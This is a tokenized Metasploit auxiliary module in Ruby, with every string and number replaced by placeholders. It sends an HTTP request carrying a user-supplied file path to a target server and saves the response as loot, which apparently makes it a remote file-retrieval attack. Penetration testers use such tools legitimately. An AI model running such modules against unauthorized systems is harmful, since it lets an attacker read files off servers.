require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Auxiliary :: Report include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> ) ) register_options ( [ Opt :: RPORT ( <int> ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def run begin print_status ( <str> datastore [ <str> ] <str> ) res = send_request_cgi ( { <str> = > <str> , <str> = > normalize_uri ( datastore [ <str> ] , <str> , <str> ) , <str> = > { <str> = > datastore [ <str> ] } , } ) rescue Rex :: ConnectionError print_error ( <str> ) return end if res && res . code == <int> if res . body . to_s . bytesize == <int> print_error ( <str> ) return end vprint_line ( res . body . to_s ) fname = File . basename ( datastore [ <str> ] ) path = store_loot ( <str> , <str> , datastore [ <str> ] , res . body , fname ) print_good ( <str> path <str> ) else print_error ( <str> ) end end end 
